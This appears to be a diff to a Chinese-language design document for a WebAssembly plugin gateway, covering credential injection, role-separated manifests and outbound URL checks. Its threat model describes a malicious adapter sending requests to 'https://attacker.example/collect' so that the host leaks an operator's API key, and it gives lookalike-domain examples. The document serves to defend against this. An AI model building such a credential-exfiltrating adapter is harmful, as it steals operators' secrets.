@@ -55,8 +55,9 @@
 | `ModelCapability` | 模型能力：tool、vision、json_schema、context_window、supported_parameters |
 | `ErrorEnvelope` | 统一错误码、HTTP status、provider/agent 原始错误摘要 |
 | `Usage` | input/output/cache/read/reasoning 等 token 口径 |
-| `HttpRequestDescriptor` | Provider 插件生成的上游请求描述，不含密钥明文 |
+| `HttpRequestDescriptor` | Provider 插件生成的上游请求描述，不含密钥明文；`auth: Auth` 声明**用哪个凭证槽位、以何种方言呈现**（Bearer / 凭证头 / OAuth），值由 host 注入 |
 | `HttpResponseParts` | host 发起 HTTP 后交给 Provider 插件解析的响应头、状态码、body/stream chunk |
+| `ProviderConfig` | host 交给 Provider 插件的上游配置：provider 名、`base_url`、凭证槽位引用（`Option<SecretRef>`，本地 Ollama 为 `None`）、模型声明。`base_url` 是 `ProviderEndpoint`，构造与反序列化都拒绝 userinfo 和 query——它是唯一由 host 流入沙箱的字段，而运维习惯把 key 写在那里 |
 
 数据流：
 
@@ -171,7 +172,11 @@ adapter-openai-provider/
 }
 ```
 
-一个插件包可以同时声明两个 role，但 runtime 必须按 role 分开加载和验收，避免一个入口适配器隐式获得 provider 权限。
+一个插件**包**（目录 / release artifact）可以同时提供两个 role，但**一个 `manifest.json` 恒为单 role**：双角色包出两份 manifest、两个 `.wasm`，各自独立走 conformance。
+
+这不是权宜之计，而是「避免一个入口适配器隐式获得 provider 权限」唯一靠类型系统兑现的方式。`provider-adapter-v1` import 了 `host`（拿得到 `sign`），`agent-adapter-v1` 什么都不 import。若把两个 role 合进一个 world，整个 component 就必须 import `host`，于是 agent 侧的导出函数也能调 `host.sign`——这条约束会从「ABI 边界保证」降级成「运行时约定」。拆开加载不是为了满足这句话，拆开**就是**这句话。
+
+推论：`kind` 字段恒为单值，`AdapterManifest::validate()` 因此可以 `match kind` 做整表校验（agent 不得声明 `providers`、provider 不得声明 `agent_hint` capability），无需按 role 拆分 `permissions` / `capabilities` / `conformance`。
 
 ---
 
@@ -218,6 +223,8 @@ provider-adapter-v1
 - `AgentHint` 只能作为路由特征输入，不能让插件直接指定最终 provider/key。
 - `parse_stream_chunk` 和 `render_stream_event` 都必须支持增量；插件不得缓存无限长度 body。
 - `map_provider_error` 与 `map_inbound_error` 都必须映射到稳定错误目录。
+- **凭证方言由 adapter 声明，明文由 host 注入**：`ProviderConfig.auth` 告诉插件这个上游有哪个凭证槽位（或没有），插件在 `HttpRequestDescriptor.auth` 里说明怎么呈现它——`Auth::Bearer`（OpenAI）、`Auth::Header{name}`（Anthropic 的 `x-api-key`、Gemini 的 `x-goog-api-key`）、`Auth::OAuth{scopes}`（平台账户上游，对应个人版 C2#2）。`Auth::Header` 的 `name` 必须落在凭证头目录内，否则 host 会把密钥写进一个下游无人脱敏的头。
+- `Auth` 是闭集，无 query-param 变体：v1 范围内没有上游需要它（看起来需要的 Gemini 接受 `x-goog-api-key`），而 URL 是最容易进日志的字段。AWS SigV4 需要把 `host.sign` 的结果放进 `Authorization`，v1 的 `SafeHeaders` 不允许——这类方言留给 `-v2`。
 
 ---
 
@@ -228,11 +235,15 @@ provider-adapter-v1
 Provider 侧正确模式：
 
 ```text
-provider plugin -> HttpRequestDescriptor(auth_ref = "provider_api_key")
-host            -> 注入 Authorization / HMAC 签名 / OAuth token
+host            -> ProviderConfig(base_url, auth = Some("provider_api_key"))
+provider plugin -> HttpRequestDescriptor(url, auth = Bearer("provider_api_key"))
+host            -> ProviderConfig::authorize(descriptor)   ← url 必须落在 base_url 内
+host            -> 解析槽位、注入明文（Bearer / 凭证头 / OAuth 换取的 token）
 host            -> 发起 HTTP
 provider plugin -> 解析响应
 ```
+
+`authorize` 这一步不可省。插件同时决定「请求发去哪」和「附哪个凭证」——单看都无害，合起来就是一条外泄通道：一个恶意 provider-adapter 返回 `url = "https://attacker.example/collect"`，host 会照常把运维的 key 注进去发出去。`ProviderConfig::authorize` 先比 origin（精确相等，`api.openai.com` 不匹配 `api.openai.com.evil.example`）再比路径前缀（按 segment 边界，`/v1` 不匹配 `/v1beta`），然后才看凭证槽位对不对得上。校验实现放在 `crates/protocol`，两端 host 共用同一份语义。
 
 Agent 侧正确模式：
 
@@ -247,14 +258,16 @@ agent plugin    -> 把 Canonical response 渲染成入口协议响应
 
 ```text
 host.sign(secret_ref, payload, algorithm) -> signature
-host.oauth_token(secret_ref, scopes) -> token_handle
 ```
+
+**没有 `host.oauth_token`。** 它只能返回两种东西：access token（那是明文凭证，插件不该持有），或者一个 handle（IR 里没有任何类型装得下它）。两条路都不通，所以 OAuth 换取动作放在 host 的注入时刻——插件用 `Auth::OAuth{secret_ref, scopes}` 声明要哪一份授权，换来的 token 从不经过沙箱。
 
 约束：
 
-- 插件只拿 `secret_ref` 或 `secret_handle`，不拿明文。
+- 插件只拿 `secret_ref`，不拿明文。`sign` 返回的签名不是凭证，插件可以把它放进普通头或 body；放不进 `Authorization`（`SafeHeaders` 拒收凭证头）。
 - host 统一做 request/response size limit、timeout、retry budget、trace_id 注入。
 - 插件不能绕过计费、预算、限流，因为 HTTP 由 host 发出，入口认证也由 host 完成。
+- 出站目的地由 `ProviderConfig::authorize` 收口；入站凭证由 `HeaderDigest` 脱敏；插件自己写的头由 `SafeHeaders` 拒收凭证头。三道都在构造和反序列化两侧生效。
 
 ---
 
